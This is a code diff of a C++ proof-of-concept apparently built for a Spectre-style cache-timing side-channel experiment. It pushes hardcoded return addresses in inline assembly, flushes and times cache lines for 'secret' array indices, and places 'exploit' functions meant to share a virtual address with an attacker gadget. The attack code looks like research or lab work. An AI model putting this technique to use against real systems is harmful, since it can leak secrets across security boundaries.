@@ -4,6 +4,7 @@
 #include <unistd.h>
 #include <sched.h>
 #define secret 1232
+#define secret2 13427
 #define nonsecret 21142
 
 using namespace std;
@@ -32,7 +33,7 @@ void trickMe() {
 	// while(1) {
 	ADDR_PTR address, tmp;
 
-	for (int i = 0; i < 1000; i++) {
+	for (int i = 0; i < 10000; i++) {
 		sched_yield();
 		asm(
 			"mov $0x0000555555554c74,%0;" "push %0;"
@@ -59,34 +60,39 @@ void trickMe() {
 		);
 	
 		// timeAndFlush((ADDR_PTR)&array[secret]);
-		total2 += measure_one_block_access_time((ADDR_PTR)&array[nonsecret]);
-		// total += measure_one_block_access_time((ADDR_PTR)&array[secret]);
-		clflush((void *)&array[nonsecret]);
-		// clflush((void *)&array[secret]);
+		total += measure_one_block_access_time((ADDR_PTR)&array[secret]);
+		total2 += measure_one_block_access_time((ADDR_PTR)&array[secret2]);
+		clflush((void *)&array[secret]);
+		clflush((void *)&array[secret2]);
 	}
 }
 
 volatile void spacer() {
 	asm(
-		".rept 1000;"
-		// ".rept 957;"
+		// ".rept 1000;"
+		".rept 957;"
 		"nop;"
 		".endr;"
 	);
 }
 
-void exploit() { // this should be at the same VA as attacker:gadget()
+void exploit1() { // this should be at the same VA as attacker:gadget()
 	volatile int temp = array[secret];
+}
+
+void exploit2() { // this should be at the same VA as attacker:gadget()
+	volatile int temp = array[secret2];
 }
 
 int main(){
 	clflush(&array[secret]);
-	// clflush(&array[nonsecret]);
+	clflush(&array[nonsecret]);
 
 	trickMe();
 
-	printf("avg time for    secret is %f\n", total/1000.0);
-	printf("avg time for nonsecret is %f\n", total2/1000.0);
+	printf("avg time for secret1 is %f\n", total/10000.0);
+	printf("avg time for secret2 is %f\n", total2/10000.0);
+	// printf("diff avg time is %f\n", total2/1000.0 - total/1000.0);
 
 	// for(int i = 0; i < 10000; i++) {
 	// 	printf("%u\n", times[i]);
